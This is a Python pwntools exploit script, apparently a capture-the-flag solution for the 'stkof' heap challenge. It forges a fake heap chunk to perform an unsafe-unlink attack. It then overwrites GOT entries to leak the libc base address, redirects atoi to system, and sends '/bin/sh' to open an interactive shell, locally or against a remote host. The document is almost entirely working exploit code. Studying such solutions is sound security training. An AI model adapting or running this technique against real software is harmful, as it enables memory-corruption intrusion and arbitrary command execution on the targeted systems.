#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import roputils as rp
import os
import sys
import pdb

elfPath = "./stkof"
libcPath = "./libc.so.6"
remoteAddr = "localhost"
remotePort = 9999

context.log_level = "debug"
context.binary = elfPath
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

elf = context.binary
if sys.argv[1] == "l":
    io = process(elfPath)
    libc = elf.libc

else:
    if sys.argv[1] == "d":
        io = process(elfPath, env = {"LD_PRELOAD": libcPath})
    else:
        io = remote(remoteAddr, remotePort)
        context.log_level = "info"
    if libcPath:
        libc = ELF(libcPath)

success = lambda name, value: log.success("{} -> {:#x}".format(name, value))

def DEBUG(bps = [], pie = False):
    cmd = "set follow-fork-mode parent\n"
    if pie:
        base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
        cmd += ''.join(['b *{:#x}\n'.format(b + base) for b in bps])
    else:
        cmd += ''.join(['b *{:#x}\n'.format(b) for b in bps])

    if bps != []:
        cmd += "c"

    gdb.attach(io, cmd)

def alloc(size):
    io.sendline("1")
    io.sendline(str(size))
    io.recvuntil("OK\n")

def read(idx, cont):
    io.sendline("2")
    io.sendline(str(idx))
    io.sendline(str(len(cont)))
    io.send(cont)
    io.recvuntil("OK\n")

def release(idx):
    io.sendline("3")
    io.sendline(str(idx))
    #  io.recvuntil("OK\n")


if __name__ == "__main__":
    alloc(0x100) # triger io buffer
    alloc(0x30) # 2
    alloc(0x80) # 3

    chunkList = 0x602140
    payload = p64(0) # prev_size
    payload += p64(0x20) # size
    payload += p64(chunkList + 0x10 - 0x18) # fd
    payload += p64(chunkList + 0x10 - 0x10) # bk
    payload += p64(0x20) # next chunk's prev_size
    payload = payload.ljust(0x30, 'a')
    payload += p64(0x30) # 3's prev_size
    payload += p64(0x90) # 3's size
    #  DEBUG([0x4009E8, 0x400B06, 0x400B7A])
    read(2, payload)
    #  DEBUG([0x400B7A])
    release(3)

    read(2, 'a' * 8 + p64(elf.got['free']) + p64(elf.got['puts']) + p64(elf.got['atoi']))
    read(0, p64(elf.plt['puts']))
    #  pause()
    #  pdb.set_trace()
    release(1)
    libc.address = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\0')) - libc.sym['puts']
    success("libc", libc.address)

    read(2, p64(libc.sym['system']))
    io.sendline("/bin/sh\0")
    
    io.interactive()
